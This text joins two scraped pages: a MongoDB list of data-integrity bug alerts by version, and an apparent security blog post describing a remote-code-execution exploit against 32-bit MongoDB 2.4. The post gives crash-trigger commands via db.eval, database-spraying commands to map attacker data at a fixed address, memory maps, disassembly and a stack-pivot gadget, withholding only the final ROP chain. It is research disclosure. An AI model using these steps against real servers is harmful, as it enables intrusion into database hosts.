A reshardCollection operation on a cluster with at least two shards can potentially omit a collections catalog entry in a shards local catalog if a movePrimary operation had previously been issued on the same cluster. This impacts operations involving data migration that lookup the database cache namely movePrimary, reshardCollection, moveRange, and moveChunk.

Affects:

**MongoDB Server**

versions:

5.0.0 - 5.0.25
6.0.0 - 6.0.14
7.0.0 - 7.0.7
7.3.0 - 7.3.1

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-86622)****10/24/2024**
####

Queries may return incomplete results when Time Series collections created prior to MongoDB 5.2 have been upgraded to MongoDB 6.0 or newer prior to those collections being cloned.
Relatedly, Time Series collections on MongoDB Rapid Releases 7.1.0-7.3.3 that had their collection granularity changed via collMod while on those versions, may have also returned incomplete query results.

Affects:

**Atlas, MongoDB Server**

versions:

6.0.0 - 6.0.16
7.0.0 - 7.0.12
7.1.0 - 7.3.3

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-91194)****10/03/2024**
####

A bug can cause incorrect results or crashes when running certain aggregation pipelines containing $group and $lookup while on MongoDB Server version 6.0.17.

Affects:

**MongoDB Server**

versions:

6.0.17

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-91570)****09/10/2024**
####

The Node.js v22.7.0 runtime contains a regression related to its handling of UTF-8 encoding that can impact the data integrity of applications using the MongoDB Node.js driver. MongoDB does not use the affected Node.js version in any of its products, however, developers using MongoDB’s Node.js driver could experience data integrity issues when data is written to their clusters via the Node.js v22.7.0 runtime.

Affects:

**MongoDB Node.js driver**

versions:

Any MongoDB Node.js driver version if data was written using Node.js v22.7.0

**[Reference Link →](/resources/products/alerts/potential-data-integrity-issues-sep-2024)****08/15/2024**
####

To balance load and maintain a high quality of service, the Atlas Serverless system occasionally migrates data of serverless instances between different database servers. Certain multi-write, non-transactional database commands are not safely auto-retried by Atlas Serverless upon migration completion, which can lead to incorrect updates and deletes behavior.

Affects:

**Atlas Serverless**

versions:

5.0+

**[Reference Link →](/resources/products/alerts/critical-alert-data-integrity-aug-2024)****07/02/2024**
####

Issues during the initial data copy in mongosync 1.1.0 – 1.7.1 may lead to some writes or documents on the source not being replicated to the destination. Upgrade to mongosync version 1.7.2 or later. Atlas Live Migrate relies on mongosync for migrations to MongoDB 6.0+ and the fix has been applied to Atlas Live Migrate.

Affects:

**Cluster-to-Cluster Sync (mongosync)**

versions:

1.1.0 - 1.7.1

**[Reference Link →](https://www.mongodb.com/docs/cluster-to-cluster-sync/current/release-notes/1.7/)****04/15/2024**
####

Issues affecting multi-document transactions on sharded clusters which can cause sharded multi-document transactions to return incorrect data and possibly miss writes.

Affects:

 **MongoDB Server**

versions:

4.4.0 - 4.4.29
5.0.0 - 5.0.25
6.0.0 - 6.0.14
7.0.0 - 7.0.8
7.1.0 - 7.3.1

**[Reference Link →](https://www.mongodb.com/alerts/critical-alert-sharding-txn-issues-apr-2024)****02/20/2024**
####

An issue in mongodump can cause keys in collection options to be dumped in the wrong order. These alterations could change the result set returned by a view or change which documents are accepted by a validator.

Affects:

**Atlas, Mongodump**

versions:

A fix has been released on Atlas, but free or shared clusters may have been impacted in the past.
Mongodump 4.2.0 - 100.9.0

**[Reference Link →](https://jira.mongodb.org/browse/TOOLS-3411)****11/29/2023**
####

An issue affecting inserts to Sharded Time Series collections can result in inserted documents on these collections to be immediately orphaned, leading to documents not being returned by queries and potential data loss.

Affects:

**MongoDB Server**

versions:

5.0.6 - 5.0.21
6.0.0 - 6.0.11
7.0.0 - 7.0.2

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-80203)****11/10/2023**
####

A race condition in mongosync 1.5 can lead to some writes on the source not being replicated to the destination. Upgrade to version 1.6 or later.

Affects:

**Cluster-to-Cluster Sync (mongosync)**

versions:

1.5.0

**[Reference Link →](https://www.mongodb.com/docs/cluster-to-cluster-sync/current/release-notes/1.6/#other-notes)****05/23/2023**
####

A storage engine issue can cause inconsistent incremental Ops Manager and Cloud Manager backups. Clusters restored from affected incremental backups can crash with checksum errors. Atlas customers/backups are not affected.

Affects:

**Ops Manager and Cloud Manager**

versions:

4.4.8 - 4.4.21
5.0.2 - 5.0.17
6.0.0 - 6.0.5

**[Reference Link →](https://jira.mongodb.org/browse/WT-10551)****03/14/2023**
####

A storage engine bug in MongoDB running on ARM64 or POWER architectures may store documents or index entries out of order, leading to inconsistencies and improperly sorted or incomplete query results.

Affects:

**MongoDB Server**

versions:

4.2.0 - 4.2.23
4.4.0 - 4.4.18
5.0.0 - 5.0.14
6.0.0 - 6.0.4
6.1.0 - 6.2.0

**[Reference Link →](https://jira.mongodb.org/browse/WT-10461)****09/19/2022**
####

A MongoDB agent issue in Atlas, Ops Manager, and Cloud Manager can cause automated "rolling index builds" to introduce index inconsistencies. MongoDB clusters on other platforms are not affected.

Affects:

**Atlas, Ops Manager, and Cloud Manager**

versions:

MongoDB versions 4.2.19+, 4.4.13+, 5.0.6+, 5.1-5.3, and 6.0.0+ running on:
- Atlas - a fix has been released on Atlas, but clusters may have been impacted in the past.
- Ops Manager versions 5.0.10-5.0.14 and 6.0.0-6.0.2
- Cloud Manager running MongoDB Agent version from 11.13.0.7438-1 to 12.4.0.7702-1

**[Reference Link →](https://www.mongodb.com/alerts/critical-alert-mongodb-rolling-index-build-issue-sept-2022)****08/11/2022**
####

A behavior change for improperly configured time-to-live (TTL) indexes can suddenly expire documents when upgrading to MongoDB 5.0 or 6.0 from version 4.4 or earlier.

Affects:

**MongoDB Server**

versions:

5.0.X
6.0.X

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-68477)****08/10/2022**
####

A sharding metadata bug in MongoDB versions 5.0.0-5.0.10 and 6.0.0 can introduce corruption during a movePrimary command.

Affects:

**MongoDB Server**

versions:

5.0.0 - 5.0.10
6.0.0

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-68511)****11/12/2021**
####

A storage engine bug in MongoDB 4.4.3 and 4.4.4 can introduce corruption when upgrading to 4.4.8-4.4.10 or 5.0.2-5.0.5. It is safe to upgrade from versions 4.4.3 and 4.4.4 directly to 4.4.11+ or 5.0.6+

Affects:

**MongoDB Server**

versions:

4.4.3
4.4.4

**[Reference Link →](https://jira.mongodb.org/browse/WT-8395)****09/22/2021**
####

A storage engine bug in MongoDB 4.4.2-4.4.8, and 5.0.0-5.0.2 can cause inconsistent data after an unclean shutdown and restart. Upgrade to version 4.4.9 or 5.0.3.

Affects:

**MongoDB Server**

versions:

4.4.2-4.4.8
5.0.0-5.0.2

**[Reference Link →](https://jira.mongodb.org/browse/WT-7995)****09/22/2021**
####

A storage engine bug in MongoDB 4.4.8 can cause inconsistent data after an unclean shutdown and restart. Upgrade to version 4.4.9.

Affects:

**MongoDB Server**

versions:

4.4.8

**[Reference Link →](https://jira.mongodb.org/browse/WT-7984)****08/06/2021**
####

A storage engine bug in MongoDB 4.4.7, 5.0.0, and 5.0.1 allows some inserts to violate unique index constraints. Upgrade to version 4.4.8 or 5.0.2.

Affects:

**MongoDB Server**

versions:

4.4.7
5.0.0
5.0.1

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-58936)****05/19/2021**
####

A storage engine bug in MongoDB 4.4.5 causes crashes on startup and may cause temporary query correctness issues. Upgrade to version 4.4.6.

Affects:

**MongoDB Server**

versions:

4.4.5

**[Reference Link →](https://jira.mongodb.org/browse/WT-7426)****10/12/2020**
####

Possible Corruption of Backup Snapshots on certain MongoDB 4.2+ Products

Affects:

**MongoDB Server**

versions:

4.2+

**[Reference Link →](https://www.mongodb.com/alerts/critical-alert-mongodb-snapshot-corruption-oct-2020)****06/16/2020**
####

Possible buffer overflow may result cause in-memory corruption on MongoDB 4.2.7 with incremental backup enabled.

Affects:

**MongoDB Server**

versions:

4.2.7

**[Reference Link →](https://jira.mongodb.org/browse/WT-6366)****01/09/2020**
####

A memory management bug can cause lost documents and index inconsistencies on replica set secondaries that restart during index builds.

Affects:

**MongoDB Server**

versions:

4.2.0
4.2.1

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-43882)****01/07/2020**
####

When MongoDB recovers from an unclean shutdown, it is possible for the recovery process to corrupt documents that have received size-changing updates.

Affects:

**MongoDB Server**

versions:

3.6.14
3.6.15

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-44584)****09/23/2019**
####

A memory management bug can cause failed operations, process crashes, and in-memory corruption of data that may be persisted to disk.

Affects:

**MongoDB Server**

versions:

4.2.0

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-42744)****02/22/2018**
####

We have identified a bug in MongoDB Compass where modification or deletion of a document through Compass may occur on a different document than expected under certain specific conditions.

Affects:

**Compass**

versions:

1.3.x - 1.11.1

**[Reference Link →](https://www.mongodb.com/alerts/critical-alert-mongodb-compass-feb-2018)****05/03/2016**
####

While a background index build is in progress, document updates modifying fields contained in the index specification may, under specific circumstances, cause mismatched index entries to appear. This has an impact on queries that use affected indexes.

Affects:

**Indexing**

versions:

3.0
3.2

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-22970)****03/30/2016**
####

During chunk migrations, insert and update operations affecting data within a migrating chunk are not reflected to the recipient shard, resulting in data loss.

Affects:

**Sharding**

versions:

3.0.9
3.0.10

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-23425)****12/16/2015**
####

In a replica set, if a secondary node is shut down cleanly while replicating writes, the node may mark certain replicated operations as successfully applied even though they have not.

Affects:

**Replication**

versions:

3.2.0

**Reference Link →****12/09/2015**
####

A race condition in WiredTiger may prevent a write operation from becoming immediately visible to subsequent read operations, which may result in various problems, primarily impacting replication.

Affects:

**WiredTiger**

versions:

3.0.0 - 3.0.7

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-21275)****06/15/2015**
####

Sharded clusters where the balancer is enabled (or there are manual chunk migrations), containing WiredTiger nodes that may become primary, may lose writes to a chunk being migrated if that chunk is under a heavy write load.

Affects:

**Sharding**

versions:

3.0.0 - 3.0.3

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-18822)****10/02/2014**
####

MongoDB installations on certain 3.x Linux kernels running on VMWare and using virtual SCSI disks managed by LVM may see corruption in namespace (.ns) files.

Affects:

**Storage**

versions:

2.4.11
2.6.4

**Reference Link →****08/03/2014**
####

An update to a text-indexed field may fail to update the text index. As a result, a text search may not match the field contents, yielding incorrect search results.

Affects:

**Text Search**

versions:

2.4.0 - 2.4.10
2.6.0

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-14738)****01/01/2014**
####

Under very rare circumstances mongos may incorrectly report a write as successful.

Affects:

**Sharding**

versions:

2.2.0 - 2.2.6
2.4.0 - 2.4.8

**Reference Link →****10/21/2013**
####

During a chunk migration in a sharded cluster, if one of the documents in the chunk has a size in the range of 16,776,185 and 16,777,216 bytes (inclusive), then some documents may be lost during the migration process

Affects:

**Sharding**

versions:

2.2.0 - 2.2.5
2.4.0 - 2.4.4

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-10478)****03/21/2013**
####

Secondary indexes (i.e. all indexes other than \_id) may be corrupted on an initial sync if write operations are performed on the sync source during the initial sync.

Affects:

**Replication**

versions:

2.4.0

**Reference Link →**
## Operations Related

**10/29/2013**
####

Caching of dbhash results may result in stale values, potentially causing disagreement among sharded cluster config servers.

Affects:

**MongoDB Server**

versions:

2.4.7

**[Reference Link →](https://jira.mongodb.org/browse/SERVER-11421)**[![MongoDB logo](https://webimages.mongodb.com/_com_assets/cms/kuyj3d95v5vbmm2f4-horizontal_white.svg?auto=format%252Ccompress)](https://www.mongodb.com)© 2024 MongoDB, Inc.

About

* [Careers](https://www.mongodb.com/careers)
* [Investor Relations](https://investors.mongodb.com)
* [Legal](https://www.mongodb.com/legal)
* [GitHub](https://github.com/mongodb)
* [Security Information](https://www.mongodb.com/company/contact/mongodb-vulnerability-disclosure-policy)
* [Trust Center](https://www.mongodb.com/products/platform/trust)
* [Connect with Us](https://www.mongodb.com/company/contact/social-media-hub)

Support

* [Contact Us](https://www.mongodb.com/company/contact)
* [Customer Portal](https://support.mongodb.com/welcome)
* [Atlas Status](https://status.mongodb.com/)
* [Customer Support](https://www.mongodb.com/services/support)

Deployment Options

* [MongoDB Atlas](https://www.mongodb.com/cloud/atlas/register)
* [Enterprise Advanced](https://www.mongodb.com/try/download/enterprise)
* [Community Edition](https://www.mongodb.com/try/download/community)

Data Basics

* [Vector Databases](https://www.mongodb.com/resources/basics/databases/vector-databases)
* [NoSQL Databases](https://www.mongodb.com/resources/basics/databases/nosql-explained)
* [Document Databases](https://www.mongodb.com/resources/basics/databases/document-databases)
* [RAG Database](https://www.mongodb.com/resources/basics/artificial-intelligence/retrieval-augmented-generation)
* [ACID Transactions](https://www.mongodb.com/resources/basics/databases/acid-transactions)
* [MERN Stack](https://www.mongodb.com/resources/languages/mern-stack)
* [MEAN Stack](https://www.mongodb.com/resources/languages/mean-stack)
© 2024 MongoDB, Inc.



=== Content from blog.scrt.ch_b05a042f_20250125_191318.html ===

[Skip to content](#content)

[![](/wp-content/uploads/2024/06/logo_cropped.png)

SCRT Team Blog](/)

Orange Cyberdefense Switzerland's technical blog

Menu and widgets

## Categories

* [Analytics](/category/analytics/) (5)
* [Antivirus](/category/antivirus/) (7)
* [Events](/category/events/) (54)
* [Exploit](/category/exploit/) (13)
* [Forensics](/category/forensics/) (7)
* [Hardware](/category/hardware/) (11)
* [Insomni'hack](/category/insomnihack/) (38)
* [News](/category/news/) (57)
* [Pentest](/category/pentest/) (9)
* [Research](/category/research/) (11)
* [Vulnerability](/category/vulnerability/) (34)
## Archives

* [2024](/2024/) (10)
* [2023](/2023/) (10)
* [2022](/2022/) (8)
* [2021](/2021/) (6)
* [2020](/2020/) (7)
* [2019](/2019/) (3)
* [2018](/2018/) (3)
* [2017](/2017/) (11)
* [2016](/2016/) (7)
* [2015](/2015/) (12)
* [2014](/2014/) (15)
* [2013](/2013/) (28)
* [2012](/2012/) (21)
* [2011](/2011/) (15)
* [2010](/2010/) (17)

# mongodb – RCE by databaseSpraying

To keep going on mongodb research here is my last interesting finding.

## Finding the Crash

In last release (after 2.2.3), 10gen chose to move to the V8 Javascript motor that sounds a very good idea. They also increased permeability in “$where” request to reduce impact of SSJI.

This time, the crash cannot be triggered from “$where” SSJI and **don’t worry** you need read-write access to a mongo database to reliably exploit it…

So as last time, I focussed on [native code] in javascript functions.
From a mongoclient, you can list every object methods by using prototypes :

```
for(var prop in DB.prototype) { print(prop + ' = ' + DB.prototype[prop]); }
```

But the only object I find with native code inside is the Mongo one :

```
> for(var prop in Mongo.prototype) { print(prop + ' = ' + Mongo.prototype[prop]); }
find = function find() { [native code] }
insert = function insert() { [native code] }
remove = function remove() { [native code] }
update = function update() { [native code] }
auth = function auth() { [native code] }
logout = function logout() { [native code] }
internalCursor = function internalCursor() { [native code] }
```

So let’s call this functions directly from prototype :

```
> db.eval('Mongo.prototype.find("a",{"b":"c"},"d","e","f","g","h")');
Fri May 31 13:34:07.514 DBClientCursor::init call() failed
Fri May 31 13:34:07.515 JavaScript execution failed: Error: error doing query: failed at src/mongo/shell/query.js:L78
Fri May 31 13:34:07.525 trying reconnect to 127.0.0.1:27017
Fri May 31 13:34:07.526 reconnect 127.0.0.1:27017 failed couldn't connect to server 127.0.0.1:27017
```

Already ? And on the server side ?

```
Fri May 31 13:34:07.387 Invalid access at address: 0x5000000 from thread: conn3
Fri May 31 13:34:07.387 Got signal: 11 (Segmentation fault).
```

Okay, we got Segmentation fault. But the address is always the same : 0x05000000
Trying to control it, I firstly abandonned the idea of making remote code exec with this bug.

## One week later…

After noSuchCon, a new idea came in my mind (sure it’s alcohol and brainSniffing at this awesome conference). In 32bits, the databases cannot be larger than 2GB, because mongo use mmap for mapping all the files database in memory : <http://blog.mongodb.org/post/137788967/32-bit-limitations>

The solution is really ugly, but it will be a good POC.
What’s happen if you fill a database :

```
> use databaseSpray
switched to db databaseSpray
> sizechunk=0x1000; chunk=""; for(i=0;i<sizechunk;i++){ chunk+="a" } for(i=0;i<600000;i++){ db.my_collection.insert({my_chunk:chunk}) }
can't map file memory - mongo requires 64 bit build for larger datasets
```

Check the mongod map :

```
08048000-09124000 r-xp 00000000 08:05 1843431 /home/agix/exploit_mongo/mongodb-linux-i686-2.4.4-rc0/bin/mongod
09124000-09167000 rw-p 010dc000 08:05 1843431 /home/agix/exploit_mongo/mongodb-linux-i686-2.4.4-rc0/bin/mongod
09167000-0941a000 rw-p 00000000 00:00 0
0966b000-09769000 rw-p 00000000 00:00 0 [heap]
0f482000-2f442000 rw-s 00000000 08:01 4448278 /data/db/databaseSpray.10
2f442000-4f402000 rw-s 00000000 08:01 4448277 /data/db/databaseSpray.9
4f402000-6f3c2000 rw-s 00000000 08:01 4448276 /data/db/databaseSpray.8
6f3c2000-8f382000 rw-s 00000000 08:01 4448275 /data/db/databaseSpray.7
8f382000-af342000 rw-s 00000000 08:01 4448274 /data/db/databaseSpray.6
af342000-cf302000 rw-s 00000000 08:01 4448273 /data/db/databaseSpray.5
cf302000-df302000 rw-s 00000000 08:01 4448272 /data/db/databaseSpray.4
df302000-e7302000 rw-s 00000000 08:01 4448271 /data/db/databaseSpray.3
e7302000-eb302000 rw-s 00000000 08:01 4448270 /data/db/databaseSpray.2
eb302000-ed302000 rw-s 00000000 08:01 4448269 /data/db/databaseSpray.1
ed302000-ee302000 rw-s 00000000 08:01 4448268 /data/db/databaseSpray.0
ee302000-ef302000 rw-s 00000000 08:01 4448267 /data/db/databaseSpray.ns
ef302000-ef303000 ---p 00000000 00:00 0
ef303000-ef403000 rw-p 00000000 00:00 0
ef403000-ef404000 ---p 00000000 00:00 0
ef404000-efc04000 rw-p 00000000 00:00 0
efc04000-f0c04000 rw-s 00000000 08:01 4448266 /data/db/local.0
f0c04000-f1c04000 rw-s 00000000 08:01 4448265 /data/db/local.ns
f1c04000-f1c05000 ---p 00000000 00:00 0
f1c05000-f2405000 rw-p 00000000 00:00 0
f2405000-f2406000 ---p 00000000 00:00 0
f2406000-f2c06000 rw-p 00000000 00:00 0
f2c06000-f2c07000 ---p 00000000 00:00 0
f2c07000-f3407000 rw-p 00000000 00:00 0
f3407000-f3408000 ---p 00000000 00:00 0
f3408000-f3c08000 rw-p 00000000 00:00 0
f3c08000-f3c09000 ---p 00000000 00:00 0
f3c09000-f4409000 rw-p 00000000 00:00 0
f4409000-f440a000 ---p 00000000 00:00 0
f440a000-f4c0a000 rw-p 00000000 00:00 0
f4c0a000-f4d7f000 r--p 00000000 08:01 1279693 /usr/lib/locale/locale-archive
f4d7f000-f4e00000 rw-p 00000000 00:00 0
f4e00000-f4e21000 rw-p 00000000 00:00 0
f4e21000-f4f00000 ---p 00000000 00:00 0
f4f45000-f4f46000 ---p 00000000 00:00 0
f4f46000-f5746000 rw-p 00000000 00:00 0
f5746000-f5747000 ---p 00000000 00:00 0
f5747000-f7453000 rw-p 00000000 00:00 0
f7453000-f7593000 r-xp 00000000 08:01 3842112 /lib32/libc-2.11.3.so
f7593000-f7594000 ---p 00140000 08:01 3842112 /lib32/libc-2.11.3.so
f7594000-f7596000 r--p 00140000 08:01 3842112 /lib32/libc-2.11.3.so
f7596000-f7597000 rw-p 00142000 08:01 3842112 /lib32/libc-2.11.3.so
f7597000-f759a000 rw-p 00000000 00:00 0
f759a000-f75af000 r-xp 00000000 08:01 3842106 /lib32/libpthread-2.11.3.so
f75af000-f75b0000 r--p 00014000 08:01 3842106 /lib32/libpthread-2.11.3.so
f75b0000-f75b1000 rw-p 00015000 08:01 3842106 /lib32/libpthread-2.11.3.so
f75b1000-f75b3000 rw-p 00000000 00:00 0
f75b3000-f75d0000 r-xp 00000000 08:01 1297070 /usr/lib32/libgcc_s.so.1
f75d0000-f75d1000 rw-p 0001c000 08:01 1297070 /usr/lib32/libgcc_s.so.1
f75d1000-f75f5000 r-xp 00000000 08:01 3842125 /lib32/libm-2.11.3.so
f75f5000-f75f6000 r--p 00023000 08:01 3842125 /lib32/libm-2.11.3.so
f75f6000-f75f7000 rw-p 00024000 08:01 3842125 /lib32/libm-2.11.3.so
f75f7000-f75f8000 rw-p 00000000 00:00 0
f75f8000-f76e1000 r-xp 00000000 08:01 1297077 /usr/lib32/libstdc++.so.6.0.13
f76e1000-f76e5000 r--p 000e9000 08:01 1297077 /usr/lib32/libstdc++.so.6.0.13
f76e5000-f76e6000 rw-p 000ed000 08:01 1297077 /usr/lib32/libstdc++.so.6.0.13
f76e6000-f76ed000 rw-p 00000000 00:00 0
f76ed000-f76f4000 r-xp 00000000 08:01 3842108 /lib32/librt-2.11.3.so
f76f4000-f76f5000 r--p 00006000 08:01 3842108 /lib32/librt-2.11.3.so
f76f5000-f76f6000 rw-p 00007000 08:01 3842108 /lib32/librt-2.11.3.so
f7709000-f7710000 r--s 00000000 08:01 2501540 /usr/lib32/gconv/gconv-modules.cache
f7710000-f7713000 rw-p 00000000 00:00 0
f7713000-f7714000 r-xp 00000000 00:00 0 [vdso]
f7714000-f7730000 r-xp 00000000 08:01 3842107 /lib32/ld-2.11.3.so
f7730000-f7731000 r--p 0001b000 08:01 3842107 /lib32/ld-2.11.3.so
f7731000-f7732000 rw-p 0001c000 08:01 3842107 /lib32/ld-2.11.3.so
ffdfc000-ffe11000 rw-p 00000000 00:00 0 [stack]
```

My databaseSpray is not covering 0x05000000 yet… but if we create a new one :

```
> use databaseMapped
switched to db databaseMapped
> sizechunk=0x1338; chunk=""; for(i=0;i<sizechunk;i++){ chunk+="x01x02x03x04x05x06x07x08"; } for(i=0;i<30000;i++){ db.my_collection.insert({my_chunk:chunk}) }
can't map file memory - mongo requires 64 bit build for larger datasets
04048000-08048000 rw-s 00000000 08:01 4448283 /data/db/databaseMapped.2
08048000-09124000 r-xp 00000000 08:05 1843431 /home/agix/exploit_mongo/mongodb-linux-i686-2.4.4-rc0/bin/mongod
09124000-09167000 rw-p 010dc000 08:05 1843431 /home/agix/exploit_mongo/mongodb-linux-i686-2.4.4-rc0/bin/mongod
09167000-0941a000 rw-p 00000000 00:00 0
0966b000-09788000 rw-p 00000000 00:00 0 [heap]
0b482000-0d482000 rw-s 00000000 08:01 4448282 /data/db/databaseMapped.1
0d482000-0e482000 rw-s 00000000 08:01 4448281 /data/db/databaseMapped.0
0e482000-0f482000 rw-s 00000000 08:01 4448280 /data/db/databaseMapped.ns
0f482000-2f442000 rw-s 00000000 08:01 4448278 /data/db/databaseSpray.10
2f442000-4f402000 rw-s 00000000 08:01 4448277 /data/db/databaseSpray.9
4f402000-6f3c2000 rw-s 00000000 08:01 4448276 /data/db/databaseSpray.8
6f3c2000-8f382000 rw-s 00000000 08:01 4448275 /data/db/databaseSpray.7
8f382000-af342000 rw-s 00000000 08:01 4448274 /data/db/databaseSpray.6
af342000-cf302000 rw-s 00000000 08:01 4448273 /data/db/databaseSpray.5
cf302000-df302000 rw-s 00000000 08:01 4448272 /data/db/databaseSpray.4
df302000-e7302000 rw-s 00000000 08:01 4448271 /data/db/databaseSpray.3
e7302000-eb302000 rw-s 00000000 08:01 4448270 /data/db/databaseSpray.2
eb302000-ed302000 rw-s 00000000 08:01 4448269 /data/db/databaseSpray.1
ed302000-ee302000 rw-s 00000000 08:01 4448268 /data/db/databaseSpray.0
ee302000-ef302000 rw-s 00000000 08:01 4448267 /data/db/databaseSpray.ns
ef302000-ef303000 ---p 00000000 00:00 0
ef303000-ef403000 rw-p 00000000 00:00 0
ef403000-ef404000 ---p 00000000 00:00 0
ef404000-efc04000 rw-p 00000000 00:00 0
efc04000-f0c04000 rw-s 00000000 08:01 4448266 /data/db/local.0
f0c04000-f1c04000 rw-s 00000000 08:01 4448265 /data/db/local.ns
f1c04000-f1c05000 ---p 00000000 00:00 0
f1c05000-f2405000 rw-p 00000000 00:00 0
f2405000-f2406000 ---p 00000000 00:00 0
f2406000-f2c06000 rw-p 00000000 00:00 0
f2c06000-f2c07000 ---p 00000000 00:00 0
f2c07000-f3407000 rw-p 00000000 00:00 0
f3407000-f3408000 ---p 00000000 00:00 0
f3408000-f3c08000 rw-p 00000000 00:00 0
f3c08000-f3c09000 ---p 00000000 00:00 0
f3c09000-f4409000 rw-p 00000000 00:00 0
f4409000-f440a000 ---p 00000000 00:00 0
f440a000-f4c0a000 rw-p 00000000 00:00 0
f4c0a000-f4d7f000 r--p 00000000 08:01 1279693 /usr/lib/locale/locale-archive
f4d7f000-f4e00000 rw-p 00000000 00:00 0
f4e00000-f4e21000 rw-p 00000000 00:00 0
f4e21000-f4f00000 ---p 00000000 00:00 0
f4f45000-f4f46000 ---p 00000000 00:00 0
f4f46000-f5746000 rw-p 00000000 00:00 0
f5746000-f5747000 ---p 00000000 00:00 0
f5747000-f7453000 rw-p 00000000 00:00 0
f7453000-f7593000 r-xp 00000000 08:01 3842112 /lib32/libc-2.11.3.so
f7593000-f7594000 ---p 00140000 08:01 3842112 /lib32/libc-2.11.3.so
f7594000-f7596000 r--p 00140000 08:01 3842112 /lib32/libc-2.11.3.so
f7596000-f7597000 rw-p 00142000 08:01 3842112 /lib32/libc-2.11.3.so
f7597000-f759a000 rw-p 00000000 00:00 0
f759a000-f75af000 r-xp 00000000 08:01 3842106 /lib32/libpthread-2.11.3.so
f75af000-f75b0000 r--p 00014000 08:01 3842106 /lib32/libpthread-2.11.3.so
f75b0000-f75b1000 rw-p 00015000 08:01 3842106 /lib32/libpthread-2.11.3.so
f75b1000-f75b3000 rw-p 00000000 00:00 0
f75b3000-f75d0000 r-xp 00000000 08:01 1297070 /usr/lib32/libgcc_s.so.1
f75d0000-f75d1000 rw-p 0001c000 08:01 1297070 /usr/lib32/libgcc_s.so.1
f75d1000-f75f5000 r-xp 00000000 08:01 3842125 /lib32/libm-2.11.3.so
f75f5000-f75f6000 r--p 00023000 08:01 3842125 /lib32/libm-2.11.3.so
f75f6000-f75f7000 rw-p 00024000 08:01 3842125 /lib32/libm-2.11.3.so
f75f7000-f75f8000 rw-p 00000000 00:00 0
f75f8000-f76e1000 r-xp 00000000 08:01 1297077 /usr/lib32/libstdc++.so.6.0.13
f76e1000-f76e5000 r--p 000e9000 08:01 1297077 /usr/lib32/libstdc++.so.6.0.13
f76e5000-f76e6000 rw-p 000ed000 08:01 1297077 /usr/lib32/libstdc++.so.6.0.13
f76e6000-f76ed000 rw-p 00000000 00:00 0
f76ed000-f76f4000 r-xp 00000000 08:01 3842108 /lib32/librt-2.11.3.so
f76f4000-f76f5000 r--p 00006000 08:01 3842108 /lib32/librt-2.11.3.so
f76f5000-f76f6000 rw-p 00007000 08:01 3842108 /lib32/librt-2.11.3.so
f7709000-f7710000 r--s 00000000 08:01 2501540 /usr/lib32/gconv/gconv-modules.cache
f7710000-f7713000 rw-p 00000000 00:00 0
f7713000-f7714000 r-xp 00000000 00:00 0 [vdso]
f7714000-f7730000 r-xp 00000000 08:01 3842107 /lib32/ld-2.11.3.so
f7730000-f7731000 r--p 0001b000 08:01 3842107 /lib32/ld-2.11.3.so
f7731000-f7732000 rw-p 0001c000 08:01 3842107 /lib32/ld-2.11.3.so
f7732000-ff732000 rw-s 00000000 08:01 4448284 /data/db/databaseMapped.3
ffdfc000-ffe11000 rw-p 00000000 00:00 0 [stack]
```

Bingo ! The “/data/db/databaseMapped.2” file is mapped at my address.
And if you restart the mongod ?

Nothing is mapped, so you have to request one of your database to force mongod to map it :

```
> use databaseSpray
switched to db databaseSpray
> db.my_collection.findOne();
> use databaseMapped
switched to db databaseMapped
> db.my_collection.findOne();
```

The files are mapped exactly to the same place o/ ! No more long loop.

## What the crash ?

The crash occurs because non initialisation of Mongo “conn” object when you directly call the prototype function. The luck is that the address at this point is mappable. So we can craft our own object.

```
0x89b68be <_ZN5mongo9mongoFindEPNS_7V8ScopeERKN2v89ArgumentsE+1070>: mov eax,DWORD PTR [edx]
0x89b68c0 <_ZN5mongo9mongoFindEPNS_7V8ScopeERKN2v89ArgumentsE+1072>: mov edx,DWORD PTR [ebp-0x14c]
0x89b68c6 <_ZN5mongo9mongoFindEPNS_7V8ScopeERKN2v89ArgumentsE+1078>: mov eax,DWORD PTR [eax]
0x89b68c8 <_ZN5mongo9mongoFindEPNS_7V8ScopeERKN2v89ArgumentsE+1080>: mov DWORD PTR [ebp-0x94],edx
0x89b68ce <_ZN5mongo9mongoFindEPNS_7V8ScopeERKN2v89ArgumentsE+1086>: mov DWORD PTR [ebp-0x170],eax
```

edx is the non initialized pointer : 0x05000000
and later :

```
0x89b69b1 <_ZN5mongo9mongoFindEPNS_7V8ScopeERKN2v89ArgumentsE+1313>: call   DWORD PTR [ebp-0x170]
```

We have to map at 0x05000000 a pointer to our first gadget. Unfortunately, this time again, we cannot use gadget made of bytes > 0x7F.

## Let’s Pivot !

At this point, we control EIP, but not the stack…

Spending all my time finding a pivot with utf-8 bytes, I only find this one : 0x0855777c

```
 0x855777c: mov esp,0x83ffd656
 0x8557781: les eax,FWORD PTR [ebx+ebx*2]
 0x8557784: pop ebp
 0x8557785: ret
```

The 0x83ffd656 address is fill with our databaseSpray. So we just have to fill the databaseSpray with our ROPChain and RCE is achieved !

## The end

I won’t publish a total exploit, the last part is boring, you just have to find a classic ropchain to copy shellcode in a RWX mmaped zone. You can use the same technique as before to pivot again in a ROP without utf-8 limlitation.

To sum up, the step :

Firstly fill a database with your ROPChain !

```
>use databaseSpray
switched to db databaseSpray
>rop="x01x02x03x04"; sizechunk=0x1000; chunk=""; for(i=0;i<sizechunk;i++){ chunk+="x74x0ax05x08"; } chunk.substring(0,(sizechunk-rop.length)); for(i=0;i<600000;i++){ db.my_collection.insert({my_chunk:chunk+rop}) }
```

Then create the good one that will fill the non initialized object.

```
>use databaseMapped
switched to db databaseMapped
> sizechunk=0x1338; chunk=""; for(i=0;i<sizechunk;i++){ chunk+="x05x7cx77x55x08x04x00x00"; } for(i=0;i<30000;i++){ db.my_collection.insert({my_chunk:chunk}) }
